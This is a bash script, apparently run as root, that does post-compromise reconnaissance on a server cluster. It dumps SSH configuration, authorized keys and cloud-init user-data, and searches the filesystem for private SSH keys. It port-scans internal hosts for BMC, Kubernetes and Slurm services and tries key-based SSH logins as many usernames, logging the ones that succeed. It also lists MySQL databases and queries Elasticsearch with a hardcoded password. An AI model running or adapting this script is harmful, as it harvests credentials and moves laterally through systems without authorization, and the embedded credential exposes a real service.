#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
D=/root/ul_farmfan; mkdir -p $D
log(){ echo "$@"; }
log "### START4 $(date -u +%FT%TZ)"
log "### SSHD-CFG"; grep -vE '^\s*#|^\s*$' /etc/ssh/sshd_config 2>/dev/null | head -40
log "### SSHD-ROOT_RSATERA"; grep -vE '^\s*#|^\s*$' /root/conf/root_rsa/sshd_config 2>/dev/null | head -40
log "### AUTHKEYS-FULL"; cat /root/.ssh/authorized_keys 2>/dev/null
log "### CA"; ls -la /etc/ssh/*.pub 2>/dev/null; grep -iE 'TrustedUserCAKeys|AuthorizedKeysCommand|AuthorizedPrincipals' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/* 2>/dev/null
log "### CLOUDINIT"; ls -la /var/lib/cloud/instance/ 2>/dev/null | head; sed -n '1,80p' /var/lib/cloud/instance/user-data.txt 2>/dev/null; grep -riE 'ssh-|authorized_keys|password' /var/lib/cloud/instance/scripts 2>/dev/null | head -10
log "### KEYGREP"
timeout 110 grep -rl --include='*' -m1 "BEGIN OPENSSH PRIVATE KEY" /etc /root /opt /ssd /data /home /var/lib 2>/dev/null | head -20
log "### VCC-REFS"
timeout 60 grep -rIl "vcc-worker" /etc /opt /root /ssd /data /home 2>/dev/null | head -20
log "### HOSTS-VCC"; getent hosts vcc-worker01 vcc-worker02 vcc-worker03 vcc-worker04 2>/dev/null; cat /etc/hosts | head -20
log "### BCM"; ls -la /opt/bcm-agent /etc/bright /cm 2>/dev/null | head -40; find / -xdev -maxdepth 4 -name 'cmsh' -o -maxdepth 4 -name 'cmdaemon*' 2>/dev/null | head
log "### BMC-PORTS"
python3 - <<'PY'
import socket,concurrent.futures
hosts=[f"192.168.0.{i}" for i in (20,21,22,24,28,30,31)]
ports=[623,8443,5900,5901,8081,8083,6817,6818,2379,6443,10250,2380,7000,7001]
tasks=[(h,p) for h in hosts for p in ports]
def chk(a):
    h,p=a
    try:
        s=socket.create_connection((h,p),1.4); s.close(); return a
    except Exception: return None
with concurrent.futures.ThreadPoolExecutor(200) as ex:
    for r in ex.map(chk,tasks):
        if r: print("OPENX",r[0],r[1],flush=True)
PY
log "### USERS-LADDER"
for h in 192.168.0.20 192.168.0.21 192.168.0.22 192.168.0.28 192.168.0.30 192.168.0.31; do
  for u in vcc bicm npa npabicm cmuser inspur bingxing syhgd gpu user1 test; do
    out=$(timeout 8 ssh -n -i /root/.ssh/id_rsa -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 "$u@$h" 'echo OK' 2>&1); rc=$?
    [ $rc -eq 0 ] && { log "HIT4 $u@$h"; echo "ACCEPT4 $h $u" >> $D/accept4.txt; break; }
  done
  log " done $h"
done
log "### MYSQL"
mysql -uroot -e "show databases;" 2>&1 | head -20
for db in $(mysql -uroot -N -e "show databases;" 2>/dev/null); do
  t=$(mysql -uroot -N -e "show tables;" $db 2>/dev/null | tr '\n' ' ')
  log "DB $db :: $t"
done
log "### ES"
timeout 6 curl -s -m 5 -u "elastic:infini_rag_flow" http://127.0.0.1:9200/_cat/indices 2>&1 | head -10
log "### DONE4 $(date -u +%FT%TZ)"
